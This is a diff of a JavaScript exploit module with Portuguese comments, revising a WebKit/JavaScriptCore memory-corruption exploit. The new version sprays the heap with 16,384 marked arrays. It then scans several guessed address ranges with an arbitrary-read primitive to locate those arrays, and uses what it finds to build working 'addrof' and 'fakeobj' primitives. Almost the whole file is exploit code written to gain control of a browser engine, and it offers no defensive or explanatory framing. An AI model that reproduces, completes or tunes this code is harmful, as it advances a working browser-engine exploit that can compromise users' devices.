@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v92 - Final com Memory Spray & Search)
+// js/script3/testArrayBufferVictimCrash.mjs (v93 - Final com Busca Agressiva)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -9,18 +9,21 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R49_Spray";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R50_Aggressive_Search";
 
-// --- Constantes para a Estratégia de Spray & Search ---
-const SPRAY_COUNT = 0x2000; // Número de objetos a pulverizar na memória
+// --- Constantes para a Estratégia de Spray & Search Agressivo ---
+const SPRAY_COUNT = 0x4000; // AUMENTADO: 16384 objetos
 const MARKER_1 = new AdvancedInt64(0x41414141, 0x41414141); // Assinatura única (A)
 const MARKER_2 = new AdvancedInt64(0x42424242, 0x42424242); // Assinatura única (B)
 
-// PONTO DE PESQUISA: Onde começar a procurar na memória. Este valor é um palpite
-// educado para a heap do JSC em sistemas de 64 bits e pode precisar de ajuste.
-const SEARCH_START_ADDRESS = new AdvancedInt64(0x00000008, 0x40000000); // Ex: 0x840000000
-const SEARCH_SIZE = 0x10000000; // Tamanho da região de memória a ser varrida (ex: 256MB)
-const SEARCH_STEP = 0x1000;     // Pular de página em página para uma busca mais rápida
+// PONTO DE PESQUISA: Defina várias faixas de memória para a busca.
+// Estes valores são suposições educadas e são o principal ponto de ajuste.
+const SEARCH_RANGES = [
+    { start: new AdvancedInt64(0x00000002, 0x00000000), size: 0x10000000 }, // Região de 2GB a 2.25GB
+    { start: new AdvancedInt64(0x00000004, 0x00000000), size: 0x10000000 }, // Região de 4GB a 4.25GB
+    { start: new AdvancedInt64(0x00000008, 0x00000000), size: 0x10000000 }, // Região de 8GB a 8.25GB
+];
+const SEARCH_STEP = 0x1000;
 
 // --- Globais ---
 let g_primitives = {
@@ -28,7 +31,7 @@ let g_primitives = {
     addrof: null,
     fakeobj: null,
 };
-let g_spray_arr = []; // Manter referência aos objetos para evitar garbage collection
+let g_spray_arr = [];
 
 function isValidPointer(ptr) {
     if (!ptr || !isAdvancedInt64Object(ptr)) return false;
@@ -40,15 +43,15 @@ function isValidPointer(ptr) {
 // --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R49 Spray & Search) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R50 Busca Agressiva) ---`, "test");
 
     try {
         await createRealPrimitives();
         if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
         logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
 
-        logS3(`--- Fase 2 (R49): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR49_Instance() {};
+        logS3(`--- Fase 2 (R50): Exploração com Primitivas Reais ---`, "subtest");
+        const targetFunctionForLeak = function someUniqueLeakFunctionR50_Instance() {};
         
         const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
         if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
@@ -79,45 +82,50 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 }
 
-// [ESTRATÉGIA FINAL] Função de bootstrap que pulveriza e busca na memória
-async function bootstrap_via_spray_and_search() {
-    logS3("Iniciando bootstrap: Fase de Spray...", "info");
+async function bootstrap_via_spray_and_search(object_to_find) {
+    logS3("Iniciando bootstrap: Fase de Spray Agressivo...", "info");
+    g_spray_arr = [];
     
     // 1. Fase de Spray
     for (let i = 0; i < SPRAY_COUNT; i++) {
-        let spray_obj = [MARKER_1, MARKER_2, {}]; // Objeto com nossa assinatura
+        let spray_obj = [MARKER_1, MARKER_2, null];
         g_spray_arr.push(spray_obj);
     }
+    // Planta o objeto que queremos encontrar no último objeto pulverizado
+    g_spray_arr[g_spray_arr.length - 1][2] = object_to_find;
+
     logS3(`${SPRAY_COUNT} objetos pulverizados na memória.`, "good");
-    await PAUSE_S3(100);
+    await PAUSE_S3(200);
 
     // 2. Fase de Busca
-    logS3(`Iniciando busca na memória de ${SEARCH_START_ADDRESS.toString(true)} a ${SEARCH_START_ADDRESS.add(SEARCH_SIZE).toString(true)}`, "info");
+    logS3("Iniciando busca agressiva na memória...", "info");
     let found_butterfly_addr = null;
 
-    for (let i = 0; i < (SEARCH_SIZE / SEARCH_STEP); i++) {
-        let current_addr = SEARCH_START_ADDRESS.add(i * SEARCH_STEP);
-        
-        try {
-            const val1 = await arb_read(current_addr, 8);
-            if (val1.equals(MARKER_1)) {
-                logS3(`[Bootstrap Search] Marcador 1 encontrado em: ${current_addr.toString(true)}`, "debug");
-                const val2 = await arb_read(current_addr.add(8), 8);
-                if (val2.equals(MARKER_2)) {
-                    found_butterfly_addr = current_addr;
-                    break;
+    for (const range of SEARCH_RANGES) {
+        logS3(`Buscando na faixa de ${range.start.toString(true)} a ${range.start.add(range.size).toString(true)}`, "debug");
+        for (let i = 0; i < (range.size / SEARCH_STEP); i++) {
+            let current_addr = range.start.add(i * SEARCH_STEP);
+            try {
+                const val1 = await arb_read(current_addr, 8);
+                if (val1.equals(MARKER_1)) {
+                    const val2 = await arb_read(current_addr.add(8), 8);
+                    if (val2.equals(MARKER_2)) {
+                        logS3(`[Bootstrap Search] SUCESSO! Assinatura encontrada em: ${current_addr.toString(true)}`, "vuln");
+                        found_butterfly_addr = current_addr;
+                        break;
+                    }
                 }
-            }
-        } catch(e) { /* Ignora erros de leitura de páginas inválidas */ }
+            } catch(e) { /* Ignora */ }
+        }
+        if (found_butterfly_addr) break;
+        logS3(`Nenhum marcador encontrado nesta faixa.`, "warn");
     }
     
-    if (!found_butterfly_addr) {
-        return null; // Retorna nulo se não encontrar
-    }
+    if (!found_butterfly_addr) return null;
 
-    // Encontramos o ponteiro para o butterfly. O objeto JSCell está 0x10 bytes antes.
-    const found_object_addr = found_butterfly_addr.sub(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-    return found_object_addr;
+    // A assinatura está no butterfly. O ponteiro para nosso 'object_to_find' está no 3º slot (offset 0x10)
+    const address_of_object_to_find = await arb_read(found_butterfly_addr.add(16), 8);
+    return address_of_object_to_find;
 }
 
 async function createRealPrimitives() {
@@ -126,27 +134,20 @@ async function createRealPrimitives() {
     let addrof_victim_arr = [{}];
     let fakeobj_victim_arr = [{a: 1.1}];
 
-    // 1. Obter o endereço de bootstrap usando a nova técnica.
-    const bootstrap_addr = await bootstrap_via_spray_and_search();
-    if (!bootstrap_addr) {
-        throw new Error("Falha ao encontrar um objeto pulverizado na memória. Tente ajustar a faixa de busca.");
+    const addrof_victim_addr = await bootstrap_via_spray_and_search(addrof_victim_arr);
+    if (!addrof_victim_addr) {
+        throw new Error("Falha ao encontrar um objeto pulverizado na memória. Tente ajustar as faixas de busca (SEARCH_RANGES).");
     }
-    logS3(`Endereço de bootstrap obtido (objeto pulverizado): ${bootstrap_addr.toString(true)}`, 'good');
+    logS3(`Endereço de bootstrap para addrof_victim_arr obtido: ${addrof_victim_addr.toString(true)}`, 'good');
 
-    // 2. Com o endereço de um objeto conhecido, construir addrof
     g_primitives.addrof = async (obj) => {
-        // Encontra o endereço de um dos objetos do spray que contém addrof_victim_arr
-        g_spray_arr[SPRAY_COUNT-1][2] = obj;
-        const sprayed_obj_addr = await bootstrap_via_spray_and_search();
-        
-        let butterfly_addr = await arb_read(sprayed_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
-        return await arb_read(butterfly_addr.add(16), 8); // Offset 2 * 8
+        addrof_victim_arr[0] = obj;
+        let butterfly_addr = await arb_read(addrof_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+        return await arb_read(butterfly_addr, 8);
     };
 
-    const addrof_victim_addr = await g_primitives.addrof(addrof_victim_arr);
-
-    // 3. Construir fakeobj
     const fakeobj_victim_addr = await g_primitives.addrof(fakeobj_victim_arr);
+    if (!isValidPointer(fakeobj_victim_addr)) throw new Error("Falha ao obter o endereço do fakeobj_victim_arr via addrof.");
     const fakeobj_butterfly_addr = await arb_read(fakeobj_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
 
     g_primitives.fakeobj = async (addr) => {
